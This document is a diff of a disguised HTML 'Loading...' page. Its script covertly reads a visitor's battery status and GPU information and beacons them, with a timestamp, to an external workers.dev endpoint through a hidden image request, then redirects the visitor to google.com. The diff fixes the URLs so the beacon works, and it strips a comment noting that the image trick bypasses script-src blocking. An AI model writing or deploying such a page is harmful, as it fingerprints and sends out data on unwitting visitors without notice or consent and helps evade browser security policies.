@@ -1,18 +1,15 @@
 <!DOCTYPE html>
 <html>
-<head><meta charset="UTF-8"></head>
+<head><meta charset="UTF-8"><title>Loading...</title></head>
 <body style="background:#000;">
 <script>
 async function xray() {
     let info = { batt: "N/A", gpu: "N/A" };
-
     try {
-        // Батарея
         if (navigator.getBattery) {
             const b = await navigator.getBattery();
             info.batt = `${Math.round(b.level * 100)}% [${b.charging ? '⚡' : '🔋'}]`;
         }
-        // Видеокарта (GPU)
         const canvas = document.createElement('canvas');
         const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
         if (gl) {
@@ -23,20 +20,19 @@ async function xray() {
 
     const t = encodeURIComponent(new Date().toLocaleString('ru-RU'));
     const d = encodeURIComponent(JSON.stringify(info));
-    const workerUrl = "[https://adminfdm.alexgranny1708.workers.dev/](https://adminfdm.alexgranny1708.workers.dev/)";
+    const workerUrl = "https://adminfdm.alexgranny1708.workers.dev/";
+    const finalUrl = "https://google.com";
 
-    // Используем Image для обхода блокировок script-src и ускорения
-    const img = new Image();
-    const go = () => window.location.replace("[https://google.com](https://google.com)");
+    const go = () => window.location.replace(finalUrl);
     
+    // Отправка данных
+    const img = new Image();
     img.onload = go;
     img.onerror = go;
     img.src = `${workerUrl}?t=${t}&d=${d}&_=${Date.now()}`;
 
-    // Запасной редирект для медленных сетей
     setTimeout(go, 2500);
 }
-
 xray();
 </script>
 </body>
